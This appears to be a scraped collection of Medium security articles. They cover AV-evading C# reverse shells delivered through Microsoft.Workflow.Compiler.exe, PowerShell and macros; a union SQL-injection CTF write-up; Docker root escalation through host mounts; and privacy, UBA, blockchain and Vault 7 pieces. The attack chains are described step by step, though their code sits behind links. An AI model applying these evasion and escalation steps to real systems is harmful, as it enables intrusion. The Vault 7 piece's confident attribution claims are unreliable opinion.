On December 2017 i wrote an article about some possible Insider Attacks that using in-memory PowerShell scripts which, months ago, were not detected by the major AV solutions. During last months, after warning all the vendors, they started to detect these attacks. Among the various attacks used in my article there was the opening of a reverse shell through the powersploit script executed directly in memory that is currently detected by most of AV vendors but…
..what would happen if that same behavior was done by a C++/C# program or something else?
Looking on github there are many examples of C# code that open reverse shells via cmd.exe. In this case i copied part of the codes and used the following simple C# program. No evasion, no persistence, no hiding code, only simple “open socket and launch the cmd.exe on victim machine”:
Source code link: https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
I put my kali in listening mode on 443 port with netcat, compiled and executed my code.
As you can see the .exe file is clean for Windows Defender. From AV side no malicious actions ware already performed. This could be a standard results.
Executing file the cmd instance is visible to the user and if the prompt window will be closed the same will happen for the shell.
Running the exe file will spawn immediately the shell on my Kali.
https://www.virustotal.com/#/file/983fe1c7d4cb293d072fcf11f8048058c458a928cbb9169c149b721082cf70aa/detection
Trying to go deeper i found different C++ codes with the same goal of the above reverse shell but one has aroused my attention. In particular i founded @NinjaParanoid’s code that opens a reverse shell with a little bit of persistence. Following some details of the code. For all the details go to the original article.
This script has 3 main advantages:
After compiling the code I analyzed it with Windows Defender and no threats were detected. At this time the exe behavior begins to be a bit borderline between malicious and non. As you can imagine as soon as you run the file the shell will be opened after 5 seconds in “silent mode”.
From user side nothing appears on screen. There is only the background process that automatically reconnects to the Kali every 5 sec if something goes wrong.
https://www.virustotal.com/#/file/a7592a117d2ebc07b0065a6a9cd8fb186f7374fae5806a24b5bcccd665a0dc07/detection
Reasoning on how to exploit the proxy credentials to open a reverse shell on the internet from an internal company network I developed the following code:
… and that’s it…
…before compile the code you need only the Proxy IP/PORT of the targeted company. For security reason i cannot share the source code for avoid the in the wild exploitation but if you have a little bit of programming skills you will write yourself all the steps chain. Obviously this attack has a very high failure rate because the victim may not have saved the domain credentials on the credential manager making the attack ineffective.
Also in this case no threats were detected by Windows Defender and other enterprise AV solutions.
Thanks to @SocketReve for helping me to write this code.
Passing over and looking deeper i found different articles that talks about arbitrary, unsigned code execution in Microsoft.Workflow.Compiler.exe. Here the articles: 1– 2– 3.
As a result of these articles I thought … why not use this technique to open my reverse shell written in C#?
In short, the articles talk about how to abuse the Microsoft.Workflow.Compiler.exe service in order to compile C# code on-the-fly. Here an command example:
The REV.txt must need the following XOML structure:
Below you will find the RAW structure of the C# code that will be compiled (same of the C# reverse shell code described above):
After running the command, the following happens:
At this point I thought … what could be the next step to evolve this attack to something more usable in a red team or in a real attack?
Easy… to give Microsoft.Workflow.Compiler.exe the files to compile, why not use PowerShell? …and here we are:
With this command the PS will download the two files described above and save them on the file system. Immediately afterwards it will abuse the Microsoft.Workflow.Compiler.exe to compile the C # live code and open the reverse shell. Following the gist links:
PowerShell Commands: https://gist.githubusercontent.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f/raw/7806b5c9642bdf39365c679addb28b6d19f31d76/PowerShell_Command.txt
REV.txt code — Rev.Shell code
Once the PS is launched the reverse shell will be opened without any detection.
As the last step of this series of attacks I tried to insert within a macro the Powershell code just described … and guess what?
The file is not detected as malicious and the reverse shell is opened without any alert.
https://www.virustotal.com/#/file/e81fe80f61a276d216c726e34ab0defc6e11fa6c333c87ec5c260f0018de89b4/detection
Many of the detections concern the macro that launch powershell and not for the actual behavior of the same. This means that if an attacker were able to obfuscate the code for not being detected or used other service to download the two files it could, without being detected, open a reversed shell as shown above.
Through the opening of several reverse shells written in different ways, this article wants to show that actions at the limit between good and evil are hardly detected by antivirus on the market. The first 2 shells are completely undetectable for all the AV on the market. The signatures related to the malicious macro concern only generic powershell and not the real abuse of microsoft services.
Critically, the arbitrary code execution technique using Microsoft.Workflow.Compiler.exe relies only on the ability to call a command, not on PowerShell. There is no need for the attacker to use some known PowerShell technique that might be detected and blocked by a security solution in place. You gain benefits such as bypassing application whitelisting and new ways of obfuscating malicious behavior. That said, when abusing Microsoft.Workflow.Compiler.exe, a temporary DLL will be created and may be detected by anti-virus.
All of that said, given recent trends it seems likely that we’ll start to see an increased number of attacks that utilize C# — or combinations of C# and PowerShell such as that featured in this article.
Written by
","['peewpw', 'Red Team', 'Cybersecurity', 'Cyberattack', 'Infosec', 'Antivirus']"
Union SQLi Challenges (Zixem Write-up) - CTF Writeups - Medium,https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4?source=tag_archive---------8-----------------------,"I’ve always avoided learning more about SQL Injections, since they’ve always seemed like quite a daunting part of Infosec. Because of this, I finally decided to put in some time to an SQLi-focused wargame in order to sharpen my skills a little. You can find the challenges at the website below:
There are only a few rules:
I’d like to extend my thanks to the creator for making these – you can reach out to him via Twitter or LinkedIn.
This challenge was a straight-forward Union-based injection.
To help us do this, let’s take a guess at what the statement looks like to find the price:
With the UNION statement, we can combine the output with other data that we want.
We first need to identify the number of columns in the table.
Let’s now try entering this:
The error message tells us that we need to enter more columns, so let’s do that:
Since the error is gone, we know that there are three columns!
However, the data isn’t showing on the page. This is because the data from the original statement is coming through before our data. To solve this, we just need to invalidate the first id:
Now, only the data from our own selection will be returned:
The ID and Price is returned as 2 and 1 respectively, which means that our own inputs are being returned.
Let’s now change 2 and 1 to version() and user(), so our final statement looks like:
The username and version were returned!
Trying the same payload as last time doesn’t return anything:
I tried changing the number of columns, but that still revealed nothing.
Let’s take another look at our concept statement:
It’s possible that this web-page is taking the ID in as a string, instead of an integer.
To fix our statement, we just need to close the quotes…
…so our final statement looks like this:
The error tells us that there is an error relating to the apostrophe. We can solve this by simply adding an apostrophe to the end of our statement:
We are now told that the number of columns is wrong. By adding a fourth column to the selection, we are returned the username and version!
Let’s start by trying the same union injection as before:
The error message tells us that the statement is being interpreted as “uni select user(),version(),3,4 — ’”, which means that the on of union is being filtered out. To combat this, we can add another on, so that even after it is removed, the statement still reads union:
The username and version is now revealed.
I’m not too sure why this was a separate challenge, as the solution is almost identical to that of Level 2.
Attempting…
…told us that the number of columns entered was wrong, so trying a couple more eventually gave me the working solution:
Viewing the source code of the page shows this:
Heading there shows:
So let’s now try the password zixemhf.
We now know exactly what we need to bruteforce.
I wrote this short python script to do just that:
Let’s now try the discovered password:
Let’s start with a generic Union statement again:
We know now for sure that there are 4 columns in a table. I began by working out the table name, which after a couple of guesses resulted in being teachers:
The rest of the challenge is simply a matter of guesswork.
The four columns ended up being id, teacher, teacher_age (that one took a while to guess) and price:
All we need to do now is ensure that the output is for the user with an ID of 11, which we can accomplish with the Where statement:
This level was really painful to do, since the text changing was only visible when viewing the source code of the page, which I didn’t think to do for ages.
Once again, let’s start with the most simple form:
While nothing is immediately visible on the page, the source code shows the following:
We see that there is a hidden input, with the value ok2. Let’s now change the 2 in our select statement to user() to view the user:
The username is revealed in the value box! We can change user() to version() to find that too:
In this challenge, I quickly discovered that entering a space into the URL causes the following error:
My first thought was to encode the space to different things, such as:
Fortunately, using either a tab or a carriage return seemed to work:
However, trying to use a Union select shows the following:
So it looks like the SELECT statement is being ignored.
In an earlier challenge, the ON of UNION was being ignored, so we added it twice. Let’s apply this to the SELECT statement too, by using SELSELECTECT, so that even when SELECT is removed, the words around it still spell out SELECT:
Our input is being returned!
Now let’s change this to show the user and version:
It’s worth mentioning that while attempting this challenge, I found another way to make this work without using tabs or carriage returns:
EDIT: After having spoken to Zixem, it turns out that this second method is the intended one.
A Union injection shows the following output:
It looks like (i) our parameters aren’t getting parsed, and (ii) it’s looking for a string. So, let’s update our query:
Running this gives an error which says that we have the wrong number of columns. After a couple of guesses, it turns out that this uses only 2:
It looks like it’s trying to open “a”, from the “./” directory. Let’s try some directory traversal to /etc/passwd:
We now have the contents of /etc/passwd.
The first thing that is immediately noticeable here is the parameter being passed in as x in the URL by default. We can URL decode & then Base64 decode this in CyberChef:
I quickly recognized this output as Uuencode from a CTF I was involved in previously. We can use a Uuencode decoder to decode this:
As this is just 1, let’s try another standard Union injection by using this encoder:
I then used CyberChef to Base64/URL encode this again, and submitted it:
I then tried a few different column sizes, before discovering that there were only 2:
All that needs to be done now is to change the 2 to user()/version().
So, my final statement looks like this…
…which turns to this, when Uuencoded…
…which in turn becomes…
…when Base64 encoded.
And with that, the final challenge has been completed!
I hope that reading these solutions helped you form a better understanding of Union injection, and how they aren’t quite as scary as they initially seem. At first I was hesitant to post the solutions online, but after Googling the challenge, it seems like many people have done it already. Thanks again to Zixem for making these, seeing as there are very few SQLi wargames out there.
Contact me:Personal WebsiteTwitterGithubHack The Box
Written by
","['All CTFs', 'ReplyCTF 2018', 'George Omnet', 'Writeup', 'Sql Injection', 'Cybersecurity', 'Zixem']"
Updated: Airline websites don’t care about your privacy: a case study on Emirates.com,https://medium.com/free-code-camp/how-airlines-dont-care-about-your-privacy-case-study-emirates-com-6271b3b8474b?source=tag_archive---------0-----------------------,"I asked my wife if it is alright if her Date of Birth is known to a stranger. Only if they send me a birthday gift, she joked. What about your passport number? She lowered the book she was reading. I now had her attention.
Now imagine this, I said “You try to check-in for your flight online, and see the error message — This booking does not exist. You try again, this surely is a mistake. Nope, still the same error message. The call center person repeats the same words. This has to be a mistake! You check your email, and there it is — staring back at you — email confirmation of cancellation. But you are sure you didn’t do it.” Whodunnit?
This is not a far-fetched scenario from a Sci-fi book, this really happened.
An organisation with a primary Digital Product that lacks even the basic data security practices is living in a utopian world where people leave their safe open and never expect a burglar to walk in.
In the wake of full disclosure, sometime last year while booking travel for my family, I stumbled across a few data-security practices that, as a Data Security advocate, made me extremely worried. When I voiced my concerns to Emirates team, this conversation took place -
For a layman, when you book your flight through Emirates, Domestic or International, there are approximately 300 data points related to your booking.
The moment you click on manage preferences to select a seat or meal for your trip or to Check-in to your flight, your Booking ID and Last name is passed on to approximately 14 different third-party trackers like Crazy egg, Boxever, Coremetrics, Google, and Facebook among others.
After I completed the booking on Emirates, I received an e-mail confirmation titled: Booking Confirmation — Booking Number.
The body of the email contained Manage booking. I proceeded to select seats and meal by clicking on the Manage Booking button and reached the Manage Preference page. This was pretty straightforward.
While as a user, I saw the normal behaviour of clicking a link and reaching the landing page “Manage Preferences”, in the background a redirection chain took place.
While Manage Booking link was supposed to be exclusive to me (the user and the website), this link was also shared with numerous third party trackers implemented by Emirates on their webpages.
The cherry on the cake was the HTTP link that leads to the Manage Preferences page. The insecureness of HTTP has been talked about over and over again, especially when it comes to maintaining the authenticity of the content and protection against interlopers. But in short, HTTP links are a Data Privacy nightmare. So, not only was Emirates passing on user information to the self-implemented third party trackers, but also allowing network adversaries to have access to the supposedly “Private” page.
Links mentioned in (1) and (2) are currently being sent to the third-parties.
Following fields take home the URL, which gives access to booking details.
Anyone who has access to these links can not only read but also edit the information that I as a user can.
For example, they can now -
Exhibit of editable personal information on this page:
a. Full Name:
b. Skywards number
c. Email ID / Telephone number:
d. Amount Paid, fare breakup.
e. Passport details, Nationality, Date of birth, Gender
Note: In October 2017, fields such as Passport Number, Email Id and Telephone number were shown to be masked on the User Interface but were not obfuscated in source code. The web app has been revamped since then and these fields are now obfuscated.
I decided to take a peek into the mobile app and see if the past catches up with the present, and lo and behold there it was in its full glory — Passport Number, Email ID and Telephone number in plain text. What was obfuscated on the web app was easy to access on the mobile app.
Now, what is wrong with this?
This issue is not only limited to Emirates, a lot of airlines like Lufthansa, KLM (last checked on October 2017) suffer from the same issues.
Every website uses third party trackers for improving their product and provide better web-usage experience. Data leaks are often considered collateral-damage and sometimes not even considered at all while implementation of such trackers.
Most of these third-parties are present on a lot of other websites and use long term identifiers like cookies etc to track users across domains. Now because one of the websites, in this case Emirates, leaks private information, these companies now potentially can not only link the user’s activity across web, but also identify who the user is.
The questions that need answering by Emirates (and others) are -
In the wake of responsible behaviour, on discovering these serious security flaws that violate user-data privacy, I decided to flag them to Emirates through Twitter DM in October 2017. Please note that I could not find a dedicated channel for reporting security bugs on Emirates website.
The Social Media Team immediately responded to my Twitter DM with a canned response but I was not ready to give up hope. I also wrote an email to the Product Manager highlighting the security flaws. I was met with a deafening silence.
As of today (2018–03–03) lot of these issues still persists.
This is a serious violation of privacy, there is no point during the whole booking process, where I agreed upon sharing any of this personal information with any of these websites.
The privacy policy of Emirates itself is not very clear. It does mention some of the of these services, but not all or the what data being shared with them.
Not an option. Unfortunately, I could not find a way to opt-out of this system provided by Emirates. I finally had to fall back on using privacy preserving browser extensions.
As a Software Engineer who has worked for the some of the largest eCommerce companies, I understand the need to use third party services for optimising and enhancing not only the Digital Product but also how user interacts with the product.
It is not the usage of third party services that is of concern here in this case but the implementation of these services. Emirates has the control of their website and what the website shares with third party services. It is this control that needs to be exercised to limit the leakage of User information.
It is not a mammoth task, it is just a matter of commitment to preserving the basic right to privacy.
For example:
If you are interested in reading more about the presence of trackers on your favourite websites, I highly recommend checking out WhoTracksMe.
Updates:
- March 6th, 2018:
Emirates responded with a standard statement.
Excerpt: “The depiction in Mr Modi’s article as to what data is being shared, or customer choice in ‘opting out’ is inaccurate.”
Here is my response: Privacy leaks round-trip: Emirates.com in denial
Happy Hacking!
- Konark Modi
Thanks for reading and sharing ! :)
If you liked this story, feel free to ��� a few times (Up to 50 times. Seriously).
Credits: Special thanks to Remi ,Pallavi for reviewing the post.
Written by
","['Archive', 'Referrer-Policy', 'CSP', 'SRI', 'Privacy', 'Data Science', 'Cybersecurity', 'Facebook', 'Tech']"
Used your credit card online in India? It’s probably stolen,https://medium.com/@fallible/used-your-credit-card-online-in-india-it-s-probably-stolen-fa2c42af0d4b?source=tag_archive---------7-----------------------,"30 Mar 2016
During the recent months we have discovered,
We have already intimated the respective payment gateways and they are working on the fix but, we are afraid we might not be the first to discover these vulnerabilities. As India still doesn’t have something similar to data breach intimation law in the US and based on our experiences from intimating severe data leaks to more than 15 companies, we do not think the companies will ever make this information known to their end users.
This is a general notice to the public to ensure that their cards are safe. Hackers generally do not attempt to use all the cards as soon as they get access to, so it is requested that you monitor your charges and statements or better disable current cards if possible. Domestic only debit cards which cannot ever work without CVV/ PIN and OTP can be assumed to be safe.
Companies name retracted due to frequent calls.
We will come back with more information regarding these issues once the respective companies have fixed the bugs. We know that no company wants to leak their customer’s payment and personal data and it will be a difficult and time intensive task to fix some of these issues.
At Fallible, we are building products to secure large organisations and startups alike. Contact us at hello@fallible.co
Originally published at fallible.co on March 30, 2016.
Written by
","['Cybersecurity', 'India', 'Startup']"
User Behavior Analytics (UBA): Next step in proactive security operations,https://medium.com/@nipungupta/user-behavior-analytics-uba-next-step-in-proactive-security-operations-a477b51444c3?source=tag_archive---------5-----------------------,"For effective information security operations, it is essential to understand activities taking place in your environment. This includes deploying tools ranging from log management to Security Information and Event Management (SIEM) to security operational automation. However, the challenge still remains — how to identify unusual activity in your environment? User Behavioral Analytics (UBA) is a potent tool to detect such anomalous activity. UBA marries big data, machine learning, and security analytics to understand the behavior of systems, the people using them and detect malicious events. Traditionally, UBA technology was deployed in the field of marketing, to help companies understand and predict purchasing patterns. Interestingly, UBA can be extraordinarily useful in the security industry too.
UBA tools perform two main functions: First, they determine a baseline of “normal” activities specific to the organization and its users. Second, UBA tools quickly highlight deviations from that norm that require further exploration. That is, they spotlight cases in which anomalous behavior is underway. That behavior may or may not signal a security issue: security analysts must investigate it and make that determination. The result is a sophisticated artificial intelligence platform that detects insider and cyber threats in real-time.
Cutting-edge security vendors, such as Exabeam, Varonis, Forcepoint, LightCyber, Bay Dynamics, GuruCul, Fortscale, Niarra, Sqrrl, and Securonix are deploying big data techniques to baseline the activities in an environment and detect anomalies that warrant further investigation. Traditional SIEM vendors like IBM (QRadar), LogRhythm, RSA, Solera, and Splunk are expanding their suites to deliver such capabilities too.
The 2016 Verizon Data Breach Investigations Report (DBIR) indicates that insider threats and privilege abuse continue to be a top security concern. As employees go rogue, one effective insider threat prevention technology that has been instrumental is UBA.
A user’s behavior and privileges are clear indicators for the motivation of a threat, enabling the security analyst to quickly determine whether a user is an insider threat or exhibiting account compromise. Using UBA tools, organizations can quickly detect and respond to high risk data exfiltration, misuse of privileged and service accounts, and detection of advanced, persistent threats.
If you currently use a SIEM tool to monitor user activity for threat management, and regulatory compliance, awesome! You are on the right path. SIEM is an excellent starting point for security analytics, as it monitors system events captured in firewalls, Intrusion Prevention Systems (IPS), logs, Data Loss Prevention (DLP), and more.
If you have SIEM, you might wonder why you need UBA, as at first glance they appear to be very similar products providing actionable intelligence. However, by focusing less on system events captured by SIEM products, and more on specific user activities, UBA builds a profile of an employee based on their usage patterns, and sends out an alert if it sees abnormal user behavior. Typically UBA alerts can be sent via e-mail, SMS, or even be piped into your SIEM. Thus, a big distinction between UBA and SIEM (other than the fact that they are complementary) is that UBA tools focus on users, rather than events or alerts. In other words, UBA answers the question, “Is this user behaving anomalously?” rather than “Is this an anomalous event?”, which helps optimize investigation and response time at the SOC.
“The issue SIEM customers have always had is that while they got a lot of great information, the user context was lacking, and the customer had to piece it all together,” — Ted Plumis, ‎Vice President of Channels, Business and Corporate Development at Exabeam
As per Verizon DBIR 2016, while attackers’ time to compromise is rapidly decreasing, the time to detect is not decreasing by the same factor. Moreover, discovery of compromised accounts or insiders is shifting from days to months and years (see graphic on the left). In other words, if this were a war — attackers are winning by a huge margin!
Newer, emerging technologies have arisen that offer to solve other challenges in simplifying investigation or response functions — all around the singular buyer problem of how to detect and respond quickly to a breach. To add to the confusion, most of these vendors across these different markets message around the same key themes, such as “analytics,” “machine learning,” “automation” or other similar terms, even though their application of those features is vastly different in terms of what they can perform in their specific role. In short, it’s a noisy, chaotic and crowded marketplace for providers to offer breach detection or adversary hunting technology.
Buyers in the UBA market have distinctive needs and need to be catered differently. Broadly, on the basis of their capabilities, buyers could be of three types:
Personally a BIG fan of predictive analytics of user behavior to rapidly detect and mitigate risks by leveraging context-enriched activity data to generate behavioral baselines from corporate users along with broader network event intelligence to triangulate to the most complex threats. — Devon Bryan, Executive Vice President and Chief Information Security Officer, The Federal Reserve System
Security buyers’ desire not only to detect breaches, but also to respond quickly and efficiently, will drive market synergies between behavior-based detection systems and SIEM systems.
While UBA enables SOC and incident response teams to identify insider threats and compromised accounts quickly, it needs to be augmented by defense-in-depth. The next few steps of cyber risk intelligence must include UBA and so much more. Organizations must understand their information assets’ business value, vulnerabilities and threats to their most valued assets so that SOC teams don’t waste their time on false positives and the real threats get addressed.
Nevertheless, security is the art of balancing risk acceptance and mitigation. So why is UBA the next step to proactive security operations ? Until recently, lack of internal visibility limited the ability for an organization to detect data breaches. Thanks to their automated, agile, and contextual nature, UBA systems provide an efficient means to detect not only perimeter breaches but also lateral movement and insider threats. If an organization is relying heavily on a SIEM that is primarily functioning as a log collection device, a UBA system is a great way to improve time to detect, time to contain, time to remediate, and overall security posture without adding heavy operational and analytical overhead on the SOC.
Written by
","['Cybersecurity', 'Uba', 'Analytics']"
User privileges in Docker containers - JobTeaser Tech - Medium,https://medium.com/jobteaser-dev-team/docker-user-best-practices-a8d2ca5205f4?source=tag_archive---------9-----------------------,"Over the past few years, Docker has become a quintessential technology used in software development. Its concept of containerization has made it easy to set up, share and deploy software projects. Therefore it’s used by a lot of tech companies (to name a few: PayPal, Uber, Spotify, VISA…). Tech companies care about the security of their data and applications. So it’s logical that Docker security is an important subject.
However, a lot of Dockerfiles contain vulnerabilities. A lot of them are written without keeping the best practices in mind. And that presents a serious threat to the security of the app that’s using Docker.
I’ll illustrate this with an example of user used in a Dockerfile.
By default, Docker containers run as root. That root user is the same root user of the host machine, with UID 0. This fact can enable hackers to perform various types of attacks on your app if they get hold of your vulnerable container:
Imagine that you have access a machine that has Docker installed and your current user is a non-root user named “vlatka” that belongs to the docker group. The root user of that host machine is making the best avocado toast ever and you’d like to know her secret which she stored in /home/vlatka/recipes/secret_ingredient.txt file.
Also, you’d like to have root privileges on the host, by not having to type the password when running sudo.
Let’s see how you can do this with the help of Docker.
On the machine there are some Dockerfiles, namely one that is used for a Python project:
You build it as an image called avocado_secret_theft:
Then you mount the whole root filesystem of your host machine to the avocado_secret_theft container and run it in interactive mode.
Once in the container, by doing ls you can see that you have the whole host file system in the host directory. As you are root now, you can access root-owned files and finally get the avocado toast secret:
And to be able to run sudo without a password, you do:
When you exit the container, you can do all the damage you want to the host machine because you have the root privilege even though you’re not root.
Most base images have the current user set to root because they’re used as a “base” to build on and install needed packages, for which root privileges are often needed. However, it is up to the creator of the Dockerfile to override that root user when it’s no longer needed so that the container is run with a less-privileged user.
That can be done with two simple instructions which create a user in the container and set it as the current user.
After having appended those lines to the existing Dockerfile, we build the image, run its container in the same way as before and try to access the avocado toast secret:
As we can see, the new container is running with toto_user and that user can’t read the root-owned files from the host machine.
To sum up, always change the user from root to a non-privileged user in your Dockerfile when you no longer need root privileges. That way your container is run in a (more) secure way.
Another lesson we can draw from this is that we should avoid adding users to docker user group unless we really trust them.
I hope this example illustrates how important it is to get acquainted with the Docker best practices. To do that, here are some articles I found useful:
Also, I suggest using a linter like Hadolint that can warn you before merging new unsafe Docker code.
Of course, a lot more can be done to secure your Docker containers, so we’d be happy to learn some of your go-to techniques. Please feel free to share and let’s discuss it!
Written by
","['Docker', 'Security', 'Cybersecurity', 'Containers', 'Linux']"
Using Blockchain Technology to Boost Cyber Security,https://medium.com/hackernoon/using-blockchain-technology-to-boost-cyber-security-19b6ef4e6898?source=tag_archive---------9-----------------------,"Navigating the online world safely has become a real concern over the last few years and, looking at how intense and sophisticated some of the recent hacker attacks around the world have been, it seems like things are bound to only get worse.
Even though hackers are getting better at hacking, the ways to combat them are also improving very fast. In fact, we already have a nearly impenetrable technology, known as blockchain, which can be used to protect our data from cyber attacks and improve cybersecurity across industries.
This article provides an overview of how blockchains can improve the online security of any business, ensuring that data cannot be damaged, stolen, or lost.
Blockchain technology has been around for just under a decade, initially introduced as a way to store and/or send the first cryptocurrency, Bitcoin. However, as the technology has gradually spread worldwide, people have begun using it in a variety of ways in numerous industries, including as a means to increase cybersecurity.
Blockchains are distributed networks that can have millions of users all over the world. Every user can add information to the blockchain and all data in the blockchain is secured through cryptography. Every other member of the network is responsible for verifying that the data being added to the blockchain is real. This is done using a system of three keys (private, public, and the receiver’s key) that allow members to check the veracity of the data while also confirming who it comes from.
A verified piece of data forms a block which then has to be added to the chain. To do this, blockchain users have to use their respective keys and powerful computing systems to run algorithms that solve very complex mathematical problems. When a problem is solved, the block is added to the chain and the data it contains exists on the network forever, meaning that it cannot be altered or removed.
In order to make updates to a particular piece of data, the owner of that data must add a new block on top of the previous block, creating a very specific chain of code. If anything, even something as small as a comma, gets altered from how it appears in a previous block, the entire chain across the network also changes accordingly. This means that every single alteration or change to any piece of data is tracked and absolutely no data is lost or deleted because users can always look at previous versions of a block to identify what is different in the latest version. Using this thorough form of record-keeping makes it easy for the system to detect blocks that have incorrect or false data, preventing loss, damage, and corruption.
Another important thing to note about blockchain users is that they are able to store all of the data in their network on their computer, if they want to (and very many of them do). This results in two things. First, they can earn money for renting their “extra” storage space and, second, they ensure that the chain will not collapse. If, for instance, someone who is not the owner of a piece of data (say, a hacker) tries to tamper with a block, the whole system analyzes every single block of data to find the one that differs from the rest (or from the majority). If the system finds this type of block, it simply excludes it from the chain, identifying it as false.
Blockchain technology is designed in such a way that there is no central authority or storage location. Every user on the network plays a part in storing some or all of the blockchain. Everyone is responsible for verifying the data that is stored and/or shared to make sure false data cannot be added and existing data cannot be removed.
Blockchain technology provides one of the best tools we currently have to protect data from hackers, preventing potential fraud and decreasing the chance of data being stolen or compromised.
In order to destroy or corrupt a blockchain, a hacker would have to destroy the data stored on every user’s computer in the global network. This could be millions of computers, with each one storing a copy of some or all the data. Unless the hacker could simultaneously bring down an entire network (which is near impossible), undamaged computers, also known as “nodes”, would continue running to verify and keep record of all the data on the network. The impossibility of a task like taking down a whole chain increases along with the amount of users on a network. Bigger blockchain networks with more users have an infinitely lower risk of getting attacked by hackers because of the complexity required to penetrate such a network.
This complex structure provides blockchain technology with the ability to be the most secure form of storing and sharing information online that we’ve discovered so far. That’s why innovators have begun applying the technology in different sectors to prevent fraud and increase protection of data.
Guardtime has already become successful in using blockchain technology to keep important data safe.
The company takes away the need to use keys for verification. Instead, they distribute every piece of data to nodes throughout the system. If someone tries to alter the data, the system analyses the whole mass of chains, compares them to the metadata packet and then excludes any that don’t match up.
This means that the only way to wipe the entire blockchain out is to destroy every single separate node. If just one node remains running with the correct data, the whole system can be restored, even if all of the other nodes are compromised.
Guardtime’s system works in such a way that it’s always able to detect when a change has been made to the data and is constantly verifying the changes. This ensures that there is no discrete way to tamper with blocks in the chain and the data remains uncompromised.
The principle behind DDoS attacks is simple but devastating. Hackers can use several techniques to instigate an attack, essentially sending myriads of junk requests to a website, increasing traffic until the site can no longer keep up with the requests. The attack goes on until the site gets overwhelmed with requests and crashes. DDoS attacks have been happening at an increased frequency recently, affecting bigger companies like Twitter, Spotify, SoundCloud, and more.
The current difficulty in preventing DDoS attacks comes from the existing Domain Name System (DNS). DNS is a partially decentralized one-to-one mapping of IP addresses to domain names and works much like a phone book for the Internet. This system is responsible for resolving human-readable domain names (like steelkiwi.com) into machine-readable IP addresses (made up of numbers).
The fact that it is only partially decentralized means that it is still vulnerable to hackers because they are able to target the centralized part of DNS (the one which stores the main bulk of data) and continue crashing one website after another.
Implementing blockchain technology would fully decentralize DNS, distributing the contents to a large number of nodes and making it nearly impossible for hackers to attack. Domain editing rights would only be granted to those who need them (domain owners) and no other user could make changes, significantly reducing the risk of data being accessed or changed by unauthorized parties. By using blockchains to protect the data, a system can ensure that it’s invulnerable to hackers, unless every single node is simultaneously wiped clean.
Some companies are already implementing blockchain in this area to prevent DDoS attacks from occurring. For instance, Blockstack provides a fully decentralized option for DNS. The concept behind the company is to make the entire worldwide web decentralized by removing all third parties from managing web servers, ID systems, and databases.
If current DNS would operate on blockchain, users would still be able to register domain names, but only authorized owners would be able to make changes to their domains. Since the data would be stored on many different nodes and every other user on the network would have a copy of the entire data on the blockchain, it would be virtually impossible to hack or destroy it completely.
MaidSafe is a similar company based in the UK. Their goal is also to decentralize the web and create something like an alternative Internet where users are able to run apps, store data, and do everything else they normally do online, but in a more secure environment. When signing up for this service, users can choose how much of their personal storage space they want to dedicate to the network. The system then provides safecoin, a cryptocurrency, to compensate users for the value (space) they offer the network. Every file placed onto the MaidSafe network is encrypted, fragmented, and shared among users. The only person that can make the data readable again is its owner, ensuring that the data is not accessible by anyone other than the authorized owner.
As more people join the worldwide web and technology continues to develop, more data gets produced and more hackers will attempt to steal or corrupt that data. The technology behind blockchain is versatile and incredibly useful for the future of the Internet, allowing users to better secure their data.
Innovative uses for blockchain technology are already becoming a part of other fields beyond cryptocurrencies and can be especially useful to boost cybersecurity. By implementing rigorous encryption and data distribution protocols on a network, any business can ensure that their information will remain safely intact and out of the reach of hackers.
If we’ve managed to captivate your interest with the ambitious prospects of the blockchain’s future in cyber security, please feel free to contact one of our sales representatives and ask them about the ways to implement this technology into your own business, thus making its benefits a part of your own life.
Written by
","['About', 'Help', 'Go Home', 'Blockchain', 'Blockchain Technology', 'Bitcoin', 'Cybersecurity', 'Ddos Protection']"
Using Wi-Fi to ‘See’ Behind Closed Doors Is Easier Than Anyone Thought,https://medium.com/mit-technology-review/using-wi-fi-to-see-behind-closed-doors-is-easier-than-anyone-thought-d9915cc4edd8?source=tag_archive---------9-----------------------,"By Emerging Technology from the arXiv
Written by
","['Wifi', 'Technology', 'Cybersecurity', 'Surveillance', 'Privacy']"
Vault 7: The Russian Hacking story is over - Bullshit.IST,https://bullshit.ist/vault-7-the-russian-hacking-story-is-over-dee16d7cdc8?source=tag_archive---------6-----------------------,"Trump may have troubling or illegal ties to the Russian mafia or government. The Putin government may have met with the Trump campaign to plan to undermine the integrity of the 2016 election. We can’t yet know all of these questions.
We can know with almost complete certainty, however, that Craig Murray and Julian Asssange’s statements that Russia had no role in the DNC and Podesta leaks will almost certainly remain the best and final word on the subject of how the emails got to Wikileaks.
Any one of dozens of individuals no longer or never associated with the CIA could have left evidence to suggest Russia was hacking the DNC. The files created by the CIA are now out there, floating around, and have been for months or years. The Russians, the CIA, a friend of a guy who worked for the CIA in 2014… too many suspects, all have the same fingerprints.
The individual who passed these programs to Wikileaks to publish today did so, perhaps, in the hope that software companies and individuals would put fixes in place to protect privacy. Wikileaks and the leaker behind Vault 7 are providing a public service in revealing the extent to which our information is still being hacked by the government, even after Obama promised to stop it following the NSA Snowden releases.
We cannot know who hacked the DNC: no authentic “Russian” trail is possible. If the government wants to make the contrary claim, that we can know Russia did hack the DNC and Podesta, they’ll have a hard time proving it. Anything that looks Russian isn’t.
We’re only a day into year zero, as Assange puts it. Vault 7 Wikileaks release includes CIA hackers having what seems like a great time. They keep in shape. They love their work, even if they complain a bit from time to time.
Who are they fighting and why? Never seems to come up. It’s just a fun job. They get to travel to Germany and play spook. This leak has already appeared in an article in Der Spiegel.
The CIA itself has a clear mission: to avoid any scrutiny of their budget and to have as much latitude to act as independently as possible. Do the president and congress have any control over these guys?
The idea that there is a real foreign enemy out there, the idea that the CIA represents the good guys fighting this foreign enemy seems utterly absurd at this point. The CIA has to prop up the enemies in order to justify their budget. Thus, the CIA is making Russia malware stronger and more scary. Imagine what would happen in the Russians were not that bad or not that effective: the CIA would have a hard time justifying their secret budget of some unknown billions of dollars.
Vault 7 is filled with strange and disturbing comments. Here we read, “Mendicant Engineer — reserved for the next tool delivered during a gov’t shutdown.” Nice to know they are ready for the shutdown. The rest of us? Not so much.
Fake-off mode is scary. “Suppress LEDs to improve look of Fake-Off mode… Turn on or leave WiFi turned on in Fake-Off mode… Parse unencrypted audio collection… During initial development, a rough approximation of bit rates for different audio quality settings were made. Quality 1 settings required 100 kB/minutes. Quality 5 settings required 250 kB/minutes. Quality 7 settings required 350 kB/min. Quality 5 seemed to provide very nice results and is usually used.”
Hello, Big Brother. Can you hear me?
